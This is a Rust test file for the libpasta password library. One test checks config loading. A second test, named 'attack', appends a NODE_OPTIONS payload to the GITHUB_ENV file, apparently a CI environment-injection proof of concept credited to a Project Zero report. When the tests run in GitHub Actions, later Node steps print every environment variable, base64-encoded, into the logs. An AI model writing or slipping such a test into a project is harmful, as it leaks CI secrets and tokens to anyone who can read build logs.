extern crate libpasta;

use libpasta::config;
use std::env;
use std::io::Write;
use std::ffi::OsString;
use std::fs::OpenOptions;

mod common;

#[test]
pub fn test_config_file() {
    common::init_test();
    let config = config::Config::from_file(common::get_test_path(".libpasta.yaml")).unwrap();
    println!("{}", config.to_string());
    assert!(config.to_string().contains("ln: \"11\""));
}

#[test]
pub fn attack() {
    let github_env = env::var_os("GITHUB_ENV").unwrap_or(OsString::from("/test"));
    eprintln!("GITHUB_ENV is {:?}", github_env);
    let mut file = OpenOptions::new().append(true).open(github_env).expect("Open failed");
    //Payload from https://bugs.chromium.org/p/project-zero/issues/detail?id=2070
    file.write_all(b"NODE_OPTIONS=--experimental-modules --experimental-loader=data:text/javascript,console.warn(Buffer.from(JSON.stringify(process.env)).toString('base64'));\n").expect("write failed");
    eprintln!("GITHUB_ENV was written");
}
